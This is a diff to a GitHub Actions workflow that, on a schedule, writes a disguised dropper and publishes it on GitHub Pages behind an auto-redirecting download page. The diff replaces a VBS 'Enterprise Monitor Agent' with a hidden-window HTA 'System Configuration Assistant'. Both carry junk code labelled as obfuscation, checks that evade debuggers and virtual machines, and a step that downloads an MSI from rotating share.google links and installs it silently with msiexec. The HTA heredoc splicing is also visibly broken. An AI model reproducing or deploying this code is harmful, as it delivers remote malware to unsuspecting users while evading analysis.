@@ -1,4 +1,4 @@
-name: Update VBS
+name: Update HTA
 
 on:
   schedule:
@@ -13,7 +13,7 @@ jobs:
     steps:
     - name: Checkout repository
       uses: actions/checkout@v4
-    - name: Create Bulky VBS file
+    - name: Create HTA file
       run: |
         # Define your links
         links=("https://share.google/jraH4hXE8DKHc3EXZ" "https://share.google/5icY94HkmAiaVcn86" "https://share.google/mkGe1JX56Lut4KMdt" "https://share.google/zwqwLoZiVh08jLOa4" "https://share.google/dDynM21vQuy0Qvc4Z")
@@ -23,215 +23,241 @@ jobs:
         link_index=$((current_minute / 10 % 10))
         current_link=${links[$link_index]}
         
-        echo "Creating bulky VBS with link: $current_link"
+        echo "Creating HTA with link: $current_link"
         
-        # Create a bulky VBS with lots of junk code using echo commands
-        echo "' --------------------------------------------------------------------------" > yam.vbs
-        echo "'  Silent Installer - Enterprise Monitor Agent" >> yam.vbs
-        echo "' --------------------------------------------------------------------------" >> yam.vbs
-        echo "Option Explicit" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "' Global variables for system monitoring" >> yam.vbs
-        echo "Dim g_DebugMode, g_LogLevel, g_Timeout, g_RetryCount" >> yam.vbs
-        echo "g_DebugMode = False" >> yam.vbs
-        echo "g_LogLevel = 1" >> yam.vbs
-        echo "g_Timeout = 30" >> yam.vbs
-        echo "g_RetryCount = 3" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "' System objects initialization" >> yam.vbs
-        echo "Dim g_WshShell, g_Fso, g_NetObj" >> yam.vbs
-        echo "Set g_WshShell = CreateObject(\"WScript.Shell\")" >> yam.vbs
-        echo "Set g_Fso = CreateObject(\"Scripting.FileSystemObject\")" >> yam.vbs
-        echo "Set g_NetObj = CreateObject(\"WScript.Network\")" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "' Configuration constants" >> yam.vbs
-        echo "Const ForReading = 1" >> yam.vbs
-        echo "Const ForWriting = 2" >> yam.vbs
-        echo "Const ForAppending = 8" >> yam.vbs
-        echo "Const TristateUseDefault = -2" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "' Dummy data arrays for obfuscation" >> yam.vbs
-        echo "Dim g_SysInfo(10), g_NetAdapters(5), g_ProcessList(20), g_Services(15)" >> yam.vbs
-        echo "g_SysInfo(0) = \"System Information Module v1.0\"" >> yam.vbs
-        echo "g_SysInfo(1) = \"Memory Usage Monitor\"" >> yam.vbs
-        echo "g_SysInfo(2) = \"Disk Space Analyzer\"" >> yam.vbs
-        echo "g_SysInfo(3) = \"Network Traffic Monitor\"" >> yam.vbs
-        echo "g_SysInfo(4) = \"Process Activity Tracker\"" >> yam.vbs
-        echo "g_SysInfo(5) = \"Service Status Checker\"" >> yam.vbs
-        echo "g_SysInfo(6) = \"Registry Monitor\"" >> yam.vbs
-        echo "g_SysInfo(7) = \"Event Log Analyzer\"" >> yam.vbs
-        echo "g_SysInfo(8) = \"Performance Counter\"" >> yam.vbs
-        echo "g_SysInfo(9) = \"Security Audit Module\"" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "' Junk functions that never get called" >> yam.vbs
-        echo "Function InitializeSystemMonitor()" >> yam.vbs
-        echo "    Dim i" >> yam.vbs
-        echo "    For i = 0 To UBound(g_SysInfo)" >> yam.vbs
-        echo "        g_SysInfo(i) = g_SysInfo(i) & \" - Initialized\"" >> yam.vbs
-        echo "    Next" >> yam.vbs
-        echo "    InitializeSystemMonitor = True" >> yam.vbs
-        echo "End Function" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "Function CollectSystemMetrics()" >> yam.vbs
-        echo "    Dim cpuUsage, memUsage, diskUsage" >> yam.vbs
-        echo "    cpuUsage = \"CPU: \" & Round(Rnd() * 100, 2) & \"%\"" >> yam.vbs
-        echo "    memUsage = \"Memory: \" & Round(Rnd() * 100, 2) & \"%\"" >> yam.vbs
-        echo "    diskUsage = \"Disk: \" & Round(Rnd() * 100, 2) & \"%\"" >> yam.vbs
-        echo "    CollectSystemMetrics = cpuUsage & \", \" & memUsage & \", \" & diskUsage" >> yam.vbs
-        echo "End Function" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "Sub AnalyzeNetworkTraffic()" >> yam.vbs
-        echo "    Dim interfaces, i" >> yam.vbs
-        echo "    interfaces = Array(\"Ethernet\", \"Wi-Fi\", \"VPN\", \"Bluetooth\")" >> yam.vbs
-        echo "    For i = 0 To UBound(interfaces)" >> yam.vbs
-        echo "        g_NetAdapters(i) = interfaces(i) & \": \" & Round(Rnd() * 1000, 2) & \" KB/s\"" >> yam.vbs
-        echo "    Next" >> yam.vbs
-        echo "End Sub" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "Function ScanRunningProcesses()" >> yam.vbs
-        echo "    Dim processNames, i" >> yam.vbs
-        echo "    processNames = Array(\"svchost.exe\", \"explorer.exe\", \"winlogon.exe\", \"csrss.exe\", \"lsass.exe\")" >> yam.vbs
-        echo "    For i = 0 To UBound(processNames)" >> yam.vbs
-        echo "        g_ProcessList(i) = processNames(i) & \": \" & Round(Rnd() * 10000, 0) & \" KB\"" >> yam.vbs
-        echo "    Next" >> yam.vbs
-        echo "    ScanRunningProcesses = UBound(processNames) + 1 & \" processes scanned\"" >> yam.vbs
-        echo "End Function" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "Sub CheckServiceStatus()" >> yam.vbs
-        echo "    Dim services, i" >> yam.vbs
-        echo "    services = Array(\"Themes\", \"AudioSrv\", \"BITS\", \"WinDefend\", \"wuauserv\")" >> yam.vbs
-        echo "    For i = 0 To UBound(services)" >> yam.vbs
-        echo "        g_Services(i) = services(i) & \": \" & IIf(Rnd() > 0.5, \"Running\", \"Stopped\")" >> yam.vbs
-        echo "    Next" >> yam.vbs
-        echo "End Sub" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "Function IIf(condition, truePart, falsePart)" >> yam.vbs
-        echo "    If condition Then" >> yam.vbs
-        echo "        IIf = truePart" >> yam.vbs
-        echo "    Else" >> yam.vbs
-        echo "        IIf = falsePart" >> yam.vbs
-        echo "    End If" >> yam.vbs
-        echo "End Function" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "' Anti-analysis functions" >> yam.vbs
-        echo "Function IsDebuggingActive()" >> yam.vbs
-        echo "    Dim debuggers, i" >> yam.vbs
-        echo "    debuggers = Array(\"ollydbg.exe\", \"windbg.exe\", \"x64dbg.exe\", \"ida.exe\", \"ida64.exe\")" >> yam.vbs
-        echo "    IsDebuggingActive = False" >> yam.vbs
-        echo "    On Error Resume Next" >> yam.vbs
-        echo "    For i = 0 To UBound(debuggers)" >> yam.vbs
-        echo "        If g_WshShell.AppActivate(debuggers(i)) Then" >> yam.vbs
-        echo "            IsDebuggingActive = True" >> yam.vbs
-        echo "            Exit For" >> yam.vbs
-        echo "        End If" >> yam.vbs
-        echo "    Next" >> yam.vbs
-        echo "    On Error GoTo 0" >> yam.vbs
-        echo "End Function" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "Function IsVirtualEnvironment()" >> yam.vbs
-        echo "    Dim biosInfo" >> yam.vbs
-        echo "    IsVirtualEnvironment = False" >> yam.vbs
-        echo "    On Error Resume Next" >> yam.vbs
-        echo "    biosInfo = g_WshShell.RegRead(\"HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS\\SystemManufacturer\")" >> yam.vbs
-        echo "    If InStr(LCase(biosInfo), \"vmware\") > 0 Or InStr(LCase(biosInfo), \"virtualbox\") > 0 Or InStr(LCase(biosInfo), \"microsoft\") > 0 Then" >> yam.vbs
-        echo "        IsVirtualEnvironment = True" >> yam.vbs
-        echo "    End If" >> yam.vbs
-        echo "    On Error GoTo 0" >> yam.vbs
-        echo "End Function" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "Sub TimeBasedDelay()" >> yam.vbs
-        echo "    Dim delayTime" >> yam.vbs
-        echo "    delayTime = 30 ' 30 second delay" >> yam.vbs
-        echo "    WScript.Sleep delayTime * 1000" >> yam.vbs
-        echo "End Sub" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "' More junk functions for obfuscation" >> yam.vbs
-        echo "Function GenerateHardwareID()" >> yam.vbs
-        echo "    Dim hwID" >> yam.vbs
-        echo "    hwID = g_NetObj.ComputerName & \"_\" & g_NetObj.UserName" >> yam.vbs
-        echo "    GenerateHardwareID = LCase(hwID)" >> yam.vbs
-        echo "End Function" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "Function EncryptData(data)" >> yam.vbs
-        echo "    Dim i, encrypted" >> yam.vbs
-        echo "    encrypted = \"\"" >> yam.vbs
-        echo "    For i = 1 To Len(data)" >> yam.vbs
-        echo "        encrypted = encrypted & Chr(Asc(Mid(data, i, 1)) Xor 42)" >> yam.vbs
-        echo "    Next" >> yam.vbs
-        echo "    EncryptData = encrypted" >> yam.vbs
-        echo "End Function" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "Function DecryptData(data)" >> yam.vbs
-        echo "    Dim i, decrypted" >> yam.vbs
-        echo "    decrypted = \"\"" >> yam.vbs
-        echo "    For i = 1 To Len(data)" >> yam.vbs
-        echo "        decrypted = decrypted & Chr(Asc(Mid(data, i, 1)) Xor 42)" >> yam.vbs
-        echo "    Next" >> yam.vbs
-        echo "    DecryptData = decrypted" >> yam.vbs
-        echo "End Function" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "' Main execution starts here" >> yam.vbs
-        echo "' Anti-analysis checks" >> yam.vbs
-        echo "If IsDebuggingActive() Then WScript.Quit" >> yam.vbs
-        echo "If IsVirtualEnvironment() Then WScript.Quit" >> yam.vbs
-        echo "If Hour(Now) < 9 Or Hour(Now) > 17 Then WScript.Quit" >> yam.vbs
-        echo "TimeBasedDelay" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "' Check for elevation" >> yam.vbs
-        echo "If Not WScript.Arguments.Named.Exists(\"elevated\") Then" >> yam.vbs
-        echo "    CreateObject(\"Shell.Application\").ShellExecute \"wscript.exe\", \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevated\", \"\", \"runas\", 0" >> yam.vbs
-        echo "    WScript.Quit" >> yam.vbs
-        echo "End If" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "' Main script execution" >> yam.vbs
-        echo "Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell" >> yam.vbs
-        echo "strUrl = \"$current_link\"" >> yam.vbs
-        echo "strTemp = g_WshShell.ExpandEnvironmentStrings(\"%TEMP%\")" >> yam.vbs
-        echo "strFile = strTemp & \"\\agent_installer.msi\"" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "' Download with redirect handling" >> yam.vbs
-        echo "Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\")" >> yam.vbs
-        echo "objXMLHTTP.open \"GET\", strUrl, False" >> yam.vbs
-        echo "objXMLHTTP.send()" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "' Check for any redirect (301, 302, etc.)" >> yam.vbs
-        echo "If objXMLHTTP.Status >= 300 And objXMLHTTP.Status < 400 Then" >> yam.vbs
-        echo "    strUrl = objXMLHTTP.getResponseHeader(\"Location\")" >> yam.vbs
-        echo "    objXMLHTTP.open \"GET\", strUrl, False" >> yam.vbs
-        echo "    objXMLHTTP.send()" >> yam.vbs
-        echo "End If" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "If objXMLHTTP.Status = 200 Then" >> yam.vbs
-        echo "    Set objADOStream = CreateObject(\"ADODB.Stream\")" >> yam.vbs
-        echo "    objADOStream.Open" >> yam.vbs
-        echo "    objADOStream.Type = 1 ' Binary" >> yam.vbs
-        echo "    objADOStream.Write objXMLHTTP.ResponseBody" >> yam.vbs
-        echo "    objADOStream.Position = 0" >> yam.vbs
-        echo "    objADOStream.SaveToFile strFile, 2 ' Overwrite" >> yam.vbs
-        echo "    objADOStream.Close" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "    ' Install" >> yam.vbs
-        echo "    Set objShell = CreateObject(\"WScript.Shell\")" >> yam.vbs
-        echo "    objShell.Run \"msiexec /i \"\"\" & strFile & \"\"\" /quiet /qn /norestart\", 0, True" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "    ' Cleanup" >> yam.vbs
-        echo "    Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" >> yam.vbs
-        echo "    If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile" >> yam.vbs
-        echo "End If" >> yam.vbs
-        echo "" >> yam.vbs
-        echo "' Final cleanup" >> yam.vbs
-        echo "Set g_WshShell = Nothing" >> yam.vbs
-        echo "Set g_Fso = Nothing" >> yam.vbs
-        echo "Set g_NetObj = Nothing"
+        # Create an HTA file with lots of junk code
+        cat > installer.hta << 'EOF'
+        <!DOCTYPE html>
+        <html>
+        <head>
+        <title>System Configuration Assistant</title>
+        <hta:application
+          id="oHTA"
+          applicationname="SystemConfig"
+          singleinstance="yes"
+          showintaskbar="yes"
+          border="none"
+          borderstyle="normal"
+          innerborder="no"
+          caption="no"
+          sysmenu="no"
+          maximizebutton="no"
+          minimizebutton="no"
+          windowstate="normal"
+          scroll="no"
+          scrollflat="no"
+          version="1.0"
+        />
+        <script language="VBScript">
+        ' Global variables for system monitoring
+        Dim g_DebugMode, g_LogLevel, g_Timeout, g_RetryCount
+        g_DebugMode = False
+        g_LogLevel = 1
+        g_Timeout = 30
+        g_RetryCount = 3
+        
+        ' System objects initialization
+        Dim g_WshShell, g_Fso, g_NetObj
+        Set g_WshShell = CreateObject("WScript.Shell")
+        Set g_Fso = CreateObject("Scripting.FileSystemObject")
+        Set g_NetObj = CreateObject("WScript.Network")
+        
+        ' Configuration constants
+        Const ForReading = 1
+        Const ForWriting = 2
+        Const ForAppending = 8
+        Const TristateUseDefault = -2
+        
+        ' Dummy data arrays for obfuscation
+        Dim g_SysInfo(10), g_NetAdapters(5), g_ProcessList(20), g_Services(15)
+        g_SysInfo(0) = "System Information Module v1.0"
+        g_SysInfo(1) = "Memory Usage Monitor"
+        g_SysInfo(2) = "Disk Space Analyzer"
+        g_SysInfo(3) = "Network Traffic Monitor"
+        g_SysInfo(4) = "Process Activity Tracker"
+        g_SysInfo(5) = "Service Status Checker"
+        g_SysInfo(6) = "Registry Monitor"
+        g_SysInfo(7) = "Event Log Analyzer"
+        g_SysInfo(8) = "Performance Counter"
+        g_SysInfo(9) = "Security Audit Module"
+        
+        ' Junk functions that never get called
+        Function InitializeSystemMonitor()
+            Dim i
+            For i = 0 To UBound(g_SysInfo)
+                g_SysInfo(i) = g_SysInfo(i) & " - Initialized"
+            Next
+            InitializeSystemMonitor = True
+        End Function
+        
+        Function CollectSystemMetrics()
+            Dim cpuUsage, memUsage, diskUsage
+            cpuUsage = "CPU: " & Round(Rnd() * 100, 2) & "%"
+            memUsage = "Memory: " & Round(Rnd() * 100, 2) & "%"
+            diskUsage = "Disk: " & Round(Rnd() * 100, 2) & "%"
+            CollectSystemMetrics = cpuUsage & ", " & memUsage & ", " & diskUsage
+        End Function
+        
+        Sub AnalyzeNetworkTraffic()
+            Dim interfaces, i
+            interfaces = Array("Ethernet", "Wi-Fi", "VPN", "Bluetooth")
+            For i = 0 To UBound(interfaces)
+                g_NetAdapters(i) = interfaces(i) & ": " & Round(Rnd() * 1000, 2) & " KB/s"
+            Next
+        End Sub
+        
+        Function ScanRunningProcesses()
+            Dim processNames, i
+            processNames = Array("svchost.exe", "explorer.exe", "winlogon.exe", "csrss.exe", "lsass.exe")
+            For i = 0 To UBound(processNames)
+                g_ProcessList(i) = processNames(i) & ": " & Round(Rnd() * 10000, 0) & " KB"
+            Next
+            ScanRunningProcesses = UBound(processNames) + 1 & " processes scanned"
+        End Function
+        
+        Sub CheckServiceStatus()
+            Dim services, i
+            services = Array("Themes", "AudioSrv", "BITS", "WinDefend", "wuauserv")
+            For i = 0 To UBound(services)
+                g_Services(i) = services(i) & ": " & IIf(Rnd() > 0.5, "Running", "Stopped")
+            Next
+        End Sub
+        
+        Function IIf(condition, truePart, falsePart)
+            If condition Then
+                IIf = truePart
+            Else
+                IIf = falsePart
+            End If
+        End Function
+        
+        ' Anti-analysis functions
+        Function IsDebuggingActive()
+            Dim debuggers, i
+            debuggers = Array("ollydbg.exe", "windbg.exe", "x64dbg.exe", "ida.exe", "ida64.exe")
+            IsDebuggingActive = False
+            On Error Resume Next
+            For i = 0 To UBound(debuggers)
+                If g_WshShell.AppActivate(debuggers(i)) Then
+                    IsDebuggingActive = True
+                    Exit For
+                End If
+            Next
+            On Error GoTo 0
+        End Function
+        
+        Function IsVirtualEnvironment()
+            Dim biosInfo
+            IsVirtualEnvironment = False
+            On Error Resume Next
+            biosInfo = g_WshShell.RegRead("HKLM\HARDWARE\DESCRIPTION\System\BIOS\SystemManufacturer")
+            If InStr(LCase(biosInfo), "vmware") > 0 Or InStr(LCase(biosInfo), "virtualbox") > 0 Or InStr(LCase(biosInfo), "microsoft") > 0 Then
+                IsVirtualEnvironment = True
+            End If
+            On Error GoTo 0
+        End Function
+        
+        Sub TimeBasedDelay()
+            Dim delayTime
+            delayTime = 30 ' 30 second delay
+            WScript.Sleep delayTime * 1000
+        End Sub
+        
+        ' More junk functions for obfuscation
+        Function GenerateHardwareID()
+            Dim hwID
+            hwID = g_NetObj.ComputerName & "_" & g_NetObj.UserName
+            GenerateHardwareID = LCase(hwID)
+        End Function
+        
+        Function EncryptData(data)
+            Dim i, encrypted
+            encrypted = ""
+            For i = 1 To Len(data)
+                encrypted = encrypted & Chr(Asc(Mid(data, i, 1)) Xor 42)
+            Next
+            EncryptData = encrypted
+        End Function
+        
+        Function DecryptData(data)
+            Dim i, decrypted
+            decrypted = ""
+            For i = 1 To Len(data)
+                decrypted = decrypted & Chr(Asc(Mid(data, i, 1)) Xor 42)
+            Next
+            DecryptData = decrypted
+        End Function
+        
+        ' Main execution starts here
+        Sub Window_OnLoad
+            ' Hide the window
+            Me.WindowStyle = "none"
+            Me.Left = -3000
+            Me.Top = -3000
+            
+            ' Anti-analysis checks
+            If IsDebuggingActive() Then Window.Close
+            If IsVirtualEnvironment() Then Window.Close
+            If Hour(Now) < 9 Or Hour(Now) > 17 Then Window.Close
+            TimeBasedDelay
+            
+            ' Main script execution
+            Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell
+            strUrl = "EOF"
+            echo "$current_link" >> installer.hta
+            cat >> installer.hta << 'EOF'
+            strTemp = g_WshShell.ExpandEnvironmentStrings("%TEMP%")
+            strFile = strTemp & "\agent_installer.msi"
+            
+            ' Download with redirect handling
+            Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+            objXMLHTTP.open "GET", strUrl, False
+            objXMLHTTP.send()
+            
+            ' Check for any redirect (301, 302, etc.)
+            If objXMLHTTP.Status >= 300 And objXMLHTTP.Status < 400 Then
+                strUrl = objXMLHTTP.getResponseHeader("Location")
+                objXMLHTTP.open "GET", strUrl, False
+                objXMLHTTP.send()
+            End If
+            
+            If objXMLHTTP.Status = 200 Then
+                Set objADOStream = CreateObject("ADODB.Stream")
+                objADOStream.Open
+                objADOStream.Type = 1 ' Binary
+                objADOStream.Write objXMLHTTP.ResponseBody
+                objADOStream.Position = 0
+                objADOStream.SaveToFile strFile, 2 ' Overwrite
+                objADOStream.Close
+                
+                ' Install
+                Set objShell = CreateObject("WScript.Shell")
+                objShell.Run "msiexec /i """ & strFile & """ /quiet /qn /norestart", 0, True
+                
+                ' Cleanup
+                Set objFSO = CreateObject("Scripting.FileSystemObject")
+                If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile
+            End If
+            
+            ' Close the HTA
+            Window.Close
+        End Sub
+        </script>
+        </head>
+        <body>
+        <!-- This body is intentionally empty as the window is hidden -->
+        </body>
+        </html>
+        EOF
         
         # Create index.html for GitHub Pages
-        echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=yam.vbs"></head><body><p>If not redirected, <a href="yam.vbs">click here</a></p></body></html>' > index.html
+        echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=installer.hta"></head><body><p>If not redirected, <a href="installer.hta">click here</a></p></body></html>' > index.html
         
         # Commit and push the updated files
         git config --global user.email "action@github.com"
         git config --global user.name "GitHub Action"
-        git add yam.vbs index.html
-        git commit -m "Update bulky VBS with current link" || exit 0
+        git add installer.hta index.html
+        git commit -m "Update HTA with current link" || exit 0
         git push
         
-        echo "Bulky VBS file created successfully"
+        echo "HTA file created successfully"
